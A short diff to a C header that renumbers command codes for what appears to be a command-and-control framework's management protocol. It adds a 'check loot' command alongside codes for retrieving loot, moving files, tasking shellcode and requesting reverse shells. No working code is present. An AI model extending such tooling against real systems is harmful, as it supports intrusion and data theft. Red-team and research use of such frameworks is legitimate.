@@ -20,12 +20,13 @@
 
 // Management commands
 #define MANAG_GET_INFO 20
-#define MANAG_GET_LOOT 21
-#define MANAG_UP_FILE 22
-#define MANAG_DOWN_FILE 23
-#define MANAG_TASK_MODULE 24
-#define MANAG_TASK_SC 25
-#define MANAG_REQ_RVSH 26
-#define MANAG_GET_AGENT 27
-#define MANAG_REG_AGENT 28
+#define MANAG_CHECK_LOOT 21
+#define MANAG_GET_LOOT 22
+#define MANAG_UP_FILE 23
+#define MANAG_DOWN_FILE 24
+#define MANAG_TASK_MODULE 25
+#define MANAG_TASK_SC 26
+#define MANAG_REQ_RVSH 27
+#define MANAG_GET_AGENT 28
+#define MANAG_REG_AGENT 29
 #define MANAG_EXIT 0
